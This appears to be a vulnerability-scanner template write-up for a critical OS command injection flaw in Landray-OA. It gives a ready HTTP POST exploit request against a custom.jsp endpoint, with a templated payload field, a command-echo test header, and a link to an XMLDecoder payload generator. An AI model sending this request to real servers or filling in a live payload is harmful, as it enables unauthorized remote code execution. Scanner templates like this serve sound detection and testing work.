# Nuclei Template: Landray-OA - Remote code Execution
**Template ID:** landray-oa-sysSearchMain-editParam-rce
**Vulnerability Class:** OS Command Injection
**Severity:** Critical
**CWE:** CWE-78
**Source:** Nuclei Template (`landray-oa-sysSearchMain-editParam-rce.yaml`)

## Vulnerability Information & PoC

## Description
Landray-OA through sysSearchMain editParam is vulnerable to Remote Code Execution.

## Steps to reproduce / Exploit Payload
```http
POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Test: echo {{randstr}}

var={{payload}}
```

## References
- https://www.modb.pro/db/555240
- https://github.com/mhaskar/XMLDecoder-payload-generator
